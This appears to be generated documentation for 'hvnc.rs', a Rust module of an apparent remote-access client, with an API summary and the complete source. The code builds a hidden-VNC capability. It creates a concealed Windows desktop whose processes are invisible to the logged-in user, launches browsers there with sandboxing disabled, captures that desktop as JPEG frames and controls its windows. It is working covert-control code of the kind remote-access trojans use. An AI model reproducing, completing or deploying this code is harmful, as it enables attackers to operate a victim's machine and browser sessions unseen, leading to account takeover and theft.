# hvnc

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/hvnc.rs` |
| **Lines** | 370 |
| **Cards** | T023-client-capabilities |
| **Role** | Hidden VNC desktop |
| **Unsafe blocks** | 8 |

## Constants

- `CREATE_NEW_CONSOLE`: `PROCESS_CREATION_FLAGS` = `PROCESS_CREATION_FLAGS(0x00000010)`
- `PROCESS_TERMINATE_RIGHTS`: `PROCESS_ACCESS_RIGHTS` = `PROCESS_ACCESS_RIGHTS(0x0001)`

## Types

### struct `HvncWindow` (line 8)

### struct `HvncManager` (line 35)

### struct `HvncManager` (line 357)

## Public API

### `new` (line 46)
```rust
pub fn new() -> Self
```

### `is_active` (line 64)
```rust
pub fn is_active(&self) -> bool
```

### `desktop_name` (line 68)
```rust
pub fn desktop_name(&self) -> &str
```

### `start` (line 72)
```rust
pub fn start(&mut self) -> bool
```

### `stop` (line 102)
```rust
pub fn stop(&mut self)
```

### `launch` (line 123)
```rust
pub fn launch(&mut self, exe_path: &str) -> bool
```

### `capture_frame` (line 179)
```rust
pub fn capture_frame(&self, quality: u8) -> Option<Vec<u8>>
```
Capture from hidden desktop as JPEG. Temporarily switches thread desktop.

### `list_windows` (line 200)
```rust
pub fn list_windows(&self) -> Vec<HvncWindow>
```

### `focus_window` (line 242)
```rust
pub fn focus_window(&mut self, hwnd_val: usize) -> bool
```

### `new` (line 359)
```rust
pub fn new() -> Self { HvncManager }
```

### `is_active` (line 360)
```rust
pub fn is_active(&self) -> bool { false }
```

### `start` (line 361)
```rust
pub fn start(&mut self) -> bool { false }
```

### `stop` (line 362)
```rust
pub fn stop(&mut self) {}
```

### `launch` (line 363)
```rust
pub fn launch(&mut self, _exe: &str) -> bool { false }
```

### `capture_frame` (line 364)
```rust
pub fn capture_frame(&self, _quality: u8) -> Option<Vec<u8>> { None }
```

### `list_windows` (line 365)
```rust
pub fn list_windows(&self) -> Vec<HvncWindow> { Vec::new() }
```

### `focus_window` (line 366)
```rust
pub fn focus_window(&mut self, _hwnd: usize) -> bool { false }
```

## Internal Functions

- `enum_callback` (unsafe) (line 212)
- `drop` (line 266)
- `browser_flags` (line 273)
- `capture_hidden_desktop` (line 288)

## Key Dependencies

- `use tracing::{info, warn, error};`
- `use super::*;`
- `use windows::Win32::Foundation::*;`
- `use windows::Win32::System::StationsAndDesktops::*;`
- `use windows::Win32::System::Threading::*;`
- `use windows::Win32::UI::WindowsAndMessaging::*;`
- `use windows::core::{PCWSTR, PWSTR};`
- `use windows::Win32::Graphics::Dwm::DwmFlush;`
- `use windows::Win32::Graphics::Gdi::*;`
- `use windows::Win32::UI::WindowsAndMessaging::*;`
- `use image::{DynamicImage, RgbImage};`
- `use super::*;`

## Full Source

```rust
// Hidden Virtual Network Computing manager.
// Creates an isolated Windows desktop via CreateDesktopW.
// Processes launched on it are invisible to the interactive user.

use tracing::{info, warn, error};

#[derive(Debug, Clone, serde::Serialize)]
pub struct HvncWindow {
    pub hwnd: usize,
    pub title: String,
}

#[cfg(windows)]
mod win {
    use super::*;
    use windows::Win32::Foundation::*;
    use windows::Win32::System::StationsAndDesktops::*;
    use windows::Win32::System::Threading::*;
    use windows::Win32::UI::WindowsAndMessaging::*;
    use windows::core::{PCWSTR, PWSTR};

    const DESKTOP_ACCESS_MASK: u32 =
        DESKTOP_CREATEWINDOW.0 |
        DESKTOP_CREATEMENU.0 |
        DESKTOP_HOOKCONTROL.0 |
        DESKTOP_JOURNALPLAYBACK.0 |
        DESKTOP_JOURNALRECORD.0 |
        DESKTOP_ENUMERATE.0 |
        DESKTOP_READOBJECTS.0 |
        DESKTOP_WRITEOBJECTS.0 |
        DESKTOP_SWITCHDESKTOP.0;
    const CREATE_NEW_CONSOLE: PROCESS_CREATION_FLAGS = PROCESS_CREATION_FLAGS(0x00000010);
    const PROCESS_TERMINATE_RIGHTS: PROCESS_ACCESS_RIGHTS = PROCESS_ACCESS_RIGHTS(0x0001);

    pub struct HvncManager {
        desktop_name: String,
        desktop_handle: Option<HDESK>,
        process_pids: Vec<u32>,
        started: bool,
        target_hwnd: Option<HWND>,
    }

    unsafe impl Send for HvncManager {}

    impl HvncManager {
        pub fn new() -> Self {
            let suffix: String = {
                use std::time::{SystemTime, UNIX_EPOCH};
                let ts = SystemTime::now()
                    .duration_since(UNIX_EPOCH)
                    .map(|d| d.subsec_nanos())
                    .unwrap_or(0);
                format!("{:08x}", ts)
            };
            HvncManager {
                desktop_name: format!("RemoteSession_{}", suffix),
                desktop_handle: None,
                process_pids: Vec::new(),
                started: false,
                target_hwnd: None,
            }
        }

        pub fn is_active(&self) -> bool {
            self.started
        }

        pub fn desktop_name(&self) -> &str {
            &self.desktop_name
        }

        pub fn start(&mut self) -> bool {
            if self.started {
                return true;
            }

            let name_wide: Vec<u16> = self.desktop_name.encode_utf16().chain(Some(0)).collect();
            unsafe {
                let handle = CreateDesktopW(
                    PCWSTR(name_wide.as_ptr()),
                    None,
                    None,
                    DESKTOP_CONTROL_FLAGS(0),
                    DESKTOP_ACCESS_MASK,
                    None,
                );
                match handle {
                    Ok(h) => {
                        self.desktop_handle = Some(h);
                        self.started = true;
                        info!("HVNC desktop created: {}", self.desktop_name);
                        true
                    }
                    Err(e) => {
                        error!("CreateDesktopW failed: {}", e);
                        false
                    }
                }
            }
        }

        pub fn stop(&mut self) {
            // Kill tracked processes
            for &pid in &self.process_pids {
                unsafe {
                    if let Ok(h) = OpenProcess(PROCESS_TERMINATE_RIGHTS, FALSE, pid) {
                        TerminateProcess(h, 1).ok();
                        CloseHandle(h).ok();
                    }
                }
            }
            self.process_pids.clear();

            if let Some(h) = self.desktop_handle.take() {
                unsafe {
                    CloseDesktop(h).ok();
                }
            }
            self.started = false;
            info!("HVNC desktop closed");
        }

        pub fn launch(&mut self, exe_path: &str) -> bool {
            if !self.started {
                warn!("HVNC not started, cannot launch {}", exe_path);
                return false;
            }
            if self.desktop_handle.is_none() {
                return false;
            }

            // CreateProcessW requires the fully-qualified name "WinSta0\DesktopName".
            // Without the window-station prefix the process falls back to the visible desktop.
            let qualified_name = format!("WinSta0\\{}", self.desktop_name);
            let desktop_name_wide: Vec<u16> = qualified_name.encode_utf16().chain(Some(0)).collect();
            // Browsers use GPU compositing which GDI BitBlt cannot capture — force software rendering.
            let extra_flags = browser_flags(exe_path);
            let cmd = format!("\"{}\"{}",  exe_path, extra_flags);
            let mut cmd_wide: Vec<u16> = cmd.encode_utf16().chain(Some(0)).collect();

            unsafe {
                let si = STARTUPINFOW {
                    cb: std::mem::size_of::<STARTUPINFOW>() as u32,
                    lpDesktop: PWSTR(desktop_name_wide.as_ptr() as *mut u16),
                    ..Default::default()
                };
                let mut pi = PROCESS_INFORMATION::default();

                let ok = CreateProcessW(
                    None,
                    PWSTR(cmd_wide.as_mut_ptr()),
                    None,
                    None,
                    FALSE,
                    CREATE_NEW_CONSOLE,
                    None,
                    None,
                    &si,
                    &mut pi,
                );

                match ok {
                    Ok(()) => {
                        CloseHandle(pi.hThread).ok();
                        CloseHandle(pi.hProcess).ok();
                        self.process_pids.push(pi.dwProcessId);
                        info!("HVNC launched {} (PID {})", exe_path, pi.dwProcessId);
                        true
                    }
                    Err(e) => {
                        error!("CreateProcessW failed for {}: {}", exe_path, e);
                        false
                    }
                }
            }
        }

        /// Capture from hidden desktop as JPEG. Temporarily switches thread desktop.
        pub fn capture_frame(&self, quality: u8) -> Option<Vec<u8>> {
            if !self.started {
                return None;
            }
            let desktop_handle = self.desktop_handle?;

            unsafe {
                let thread_id = GetCurrentThreadId();
                let original = GetThreadDesktop(thread_id).ok()?;

                if SetThreadDesktop(desktop_handle).is_err() {
                    return None;
                }

                let result = capture_hidden_desktop(quality);

                SetThreadDesktop(original).ok();
                result
            }
        }

        pub fn list_windows(&self) -> Vec<HvncWindow> {
            if !self.started {
                return Vec::new();
            }
            let desktop_handle = match &self.desktop_handle {
                Some(h) => *h,
                None => return Vec::new(),
            };

            let mut windows: Vec<HvncWindow> = Vec::new();
            let ptr = &mut windows as *mut Vec<HvncWindow>;

            unsafe extern "system" fn enum_callback(
                hwnd: HWND,
                lparam: LPARAM,
            ) -> BOOL {
                let windows = &mut *(lparam.0 as *mut Vec<HvncWindow>);
                if IsWindowVisible(hwnd).as_bool() {
                    let mut buf = [0u16; 256];
                    let len = GetWindowTextW(hwnd, &mut buf);
                    if len > 0 {
                        let title = String::from_utf16_lossy(&buf[..len as usize]);
                        windows.push(HvncWindow {
                            hwnd: hwnd.0 as usize,
                            title,
                        });
                    }
                }
                TRUE
            }

            unsafe {
                EnumDesktopWindows(
                    desktop_handle,
                    Some(enum_callback),
                    LPARAM(ptr as isize),
                ).ok();
            }

            windows
        }

        pub fn focus_window(&mut self, hwnd_val: usize) -> bool {
            if !self.started {
                return false;
            }
            let hwnd = HWND(hwnd_val as isize);
            self.target_hwnd = Some(hwnd);
            let desktop_handle = match &self.desktop_handle {
                Some(h) => *h,
                None => return false,
            };
            unsafe {
                let thread_id = GetCurrentThreadId();
                if let Ok(original) = GetThreadDesktop(thread_id) {
                    SetThreadDesktop(desktop_handle).ok();
                    let _ = SetForegroundWindow(hwnd);
                    SetThreadDesktop(original).ok();
                    return true;
                }
            }
            false
        }
    }

    impl Drop for HvncManager {
        fn drop(&mut self) {
            if self.started {
                self.stop();
            }
        }
    }

    fn browser_flags(exe_path: &str) -> &'static str {
        let name = exe_path
            .rsplit(|c| c == '/' || c == '\\')
            .next()
            .unwrap_or("")
            .to_ascii_lowercase();
        match name.as_str() {
            "chrome.exe" | "msedge.exe" | "brave.exe" | "vivaldi.exe" | "chromium.exe" =>
                " --disable-gpu --disable-software-rasterizer --no-sandbox --disable-gpu-compositing",
            "firefox.exe" | "waterfox.exe" | "librewolf.exe" =>
                " --disable-gpu -no-remote",
            _ => "",
        }
    }

    fn capture_hidden_desktop(quality: u8) -> Option<Vec<u8>> {
        use windows::Win32::Graphics::Dwm::DwmFlush;
        use windows::Win32::Graphics::Gdi::*;
        use windows::Win32::UI::WindowsAndMessaging::*;

        unsafe {
            // Sync DWM compositor so software-rendered content is flushed before GDI capture.
            let _ = DwmFlush();
            let screen_w = GetSystemMetrics(SM_CXSCREEN) as u32;
            let screen_h = GetSystemMetrics(SM_CYSCREEN) as u32;

            // GetDC(HWND(0)) == GetDC(NULL): returns the physical display DC,
            // always the visible desktop regardless of SetThreadDesktop.
            // After SetThreadDesktop, GetDesktopWindow() returns the hidden
            // desktop's root window — its DC is what we must BitBlt from.
            let hwnd_desktop = GetDesktopWindow();
            let screen_dc = GetDC(hwnd_desktop);
            if screen_dc.is_invalid() {
                return None;
            }
            let mem_dc = CreateCompatibleDC(screen_dc);
            let bmp = CreateCompatibleBitmap(screen_dc, screen_w as i32, screen_h as i32);
            let old = SelectObject(mem_dc, bmp);

            BitBlt(mem_dc, 0, 0, screen_w as i32, screen_h as i32, screen_dc, 0, 0, SRCCOPY).ok()?;

            let mut bmi = BITMAPINFO {
                bmiHeader: BITMAPINFOHEADER {
                    biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
                    biWidth: screen_w as i32,
                    biHeight: -(screen_h as i32),
                    biPlanes: 1,
                    biBitCount: 32,
                    biCompression: BI_RGB.0,
                    ..Default::default()
                },
                ..Default::default()
            };

            let mut raw = vec![0u8; (screen_w * screen_h * 4) as usize];
            GetDIBits(mem_dc, bmp, 0, screen_h, Some(raw.as_mut_ptr() as *mut _), &mut bmi, DIB_RGB_COLORS);

            SelectObject(mem_dc, old);
            DeleteObject(bmp);
            DeleteDC(mem_dc);
            ReleaseDC(hwnd_desktop, screen_dc);

            // Convert BGRA → RGB and encode as JPEG
            let mut rgb = Vec::with_capacity((screen_w * screen_h * 3) as usize);
            for chunk in raw.chunks(4) {
                rgb.push(chunk[2]); // R
                rgb.push(chunk[1]); // G
                rgb.push(chunk[0]); // B
            }

            use image::{DynamicImage, RgbImage};
            let img = RgbImage::from_raw(screen_w, screen_h, rgb)?;
            let dyn_img = DynamicImage::ImageRgb8(img);
            let mut buf = std::io::Cursor::new(Vec::new());
            dyn_img.write_to(&mut buf, image::ImageFormat::Jpeg).ok()?;
            Some(buf.into_inner())
        }
    }
}

#[cfg(not(windows))]
mod win {
    use super::*;

    pub struct HvncManager;
    impl HvncManager {
        pub fn new() -> Self { HvncManager }
        pub fn is_active(&self) -> bool { false }
        pub fn start(&mut self) -> bool { false }
        pub fn stop(&mut self) {}
        pub fn launch(&mut self, _exe: &str) -> bool { false }
        pub fn capture_frame(&self, _quality: u8) -> Option<Vec<u8>> { None }
        pub fn list_windows(&self) -> Vec<HvncWindow> { Vec::new() }
        pub fn focus_window(&mut self, _hwnd: usize) -> bool { false }
    }
}

pub use win::HvncManager;

```